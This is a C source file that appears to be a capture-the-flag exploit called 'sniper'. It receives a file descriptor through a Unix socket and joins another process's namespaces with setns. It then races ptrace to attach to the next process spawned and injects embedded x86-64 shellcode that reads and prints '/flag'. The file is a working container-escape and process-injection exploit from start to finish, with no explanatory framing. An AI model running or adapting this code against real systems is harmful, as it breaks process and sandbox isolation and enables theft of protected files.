#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include "report.h"
#include "inject.c"



const char sc[75] = {0xeb, 0x3f, 0x5f, 0x80, 0x77, 0x0b, 0x41, 0x48, 0x31, 0xc0, 0x04, 0x02, 0x48, 0x31, 0xf6, 0x0f, 0x05, 0x66, 0x81, 0xec, 0xff, 0x0f, 0x48, 0x8d, 0x34, 0x24, 0x48, 0x89, 0xc7, 0x48, 0x31, 0xd2, 0x66, 0xba, 0xff, 0x0f, 0x48, 0x31, 0xc0, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x40, 0x80, 0xc7, 0x01, 0x48, 0x89, 0xc2, 0x48, 0x31, 0xc0, 0x04, 0x01, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x04, 0x3c, 0x0f, 0x05, 0xe8, 0xbc, 0xff, 0xff, 0xff, 0x2f,  0x66, 0x6c, 0x61, 0x67};

char * socket_path = "socket";

void my_err(char * msg)
{
    write_error("sniper", msg);
}
void my_log(char * msg, int arg)
{
    write_log("sniper", msg, arg);
}

int main(int argc, char * argv[])
{
	struct sockaddr_un addr;
	char buf[100];
	int fd,rc, cl;
    int ret;
    report("sniper");
	if ( (fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
		my_err("socket error");
		exit(-1);
	}

	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path));

    my_log("binding", 0);
	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
		my_err("bind error");
		exit(-1);
	}

    my_log("listening", 0);
	if (listen(fd, 5) == -1) {
		my_err("listen error");
		exit(-1);
	}

    my_log("accepting", 0);
	if ( (cl = accept(fd, NULL, NULL)) == -1) {
		my_err("accept error");
		return -1;
	}

    my_log("recving", 0);
	int remote_fd = recv_fd(cl);
    my_log("recved fd", remote_fd);

    char * NSS[] = {"user", "mnt", "pid", "uts", "ipc", "cgroup"};
    char path[1024];
    for (int i = 0; i < 6; i++)
    {
        snprintf(path, 1024, "proc/10/ns/%s", NSS[i]);
        my_log(NSS[i], 0);
        int ns = openat(remote_fd, path, 0);
        if (ns < 0)
        {
            my_err("openat");
        }
        int ret = setns(ns, 0);
        if (ret < 0)
        {
            my_err("setns user");
        }
    }
    if (fork())
    {
        sleep(3000);
    }
    report("sniper");

    sleep(2);
    int last_pid_file = openat(remote_fd, "proc/sys/kernel/ns_last_pid", O_RDONLY);
    char read_buf[10] = {0};
    ret = read(last_pid_file, read_buf, 10);
    int last_pid = atoi(read_buf);
    close(last_pid_file);
    my_log("last_pid", last_pid);
    last_pid = 3;

    ret = -1;
    int pid = 0;
    while(ret < 0)
    {
        for (int i = 0; i < 1000; i++)
        {
            ret = ptrace(PTRACE_ATTACH, last_pid + 1, NULL, NULL);
            if (ret >= 0)
            {
                pid = last_pid + 1;
                break;
            }
            else if (errno != 3)
                break;
        }
        last_pid_file = openat(remote_fd, "proc/sys/kernel/ns_last_pid", O_RDONLY);
        int ignore_ret = read(last_pid_file, read_buf, 10);
        int new_last_pid = atoi(read_buf);
        if (new_last_pid > last_pid)
        {
            my_log("last_pid", new_last_pid);
            last_pid = new_last_pid;
        }
        close(last_pid_file);
    }
    my_log("attached", pid);
    waitpid(pid, &ret, 0);
	ps_inject(sc, 75, pid);

	if (ret < 0)
	{
        my_err("ptrace attach");
    }

    sleep(3000);
}
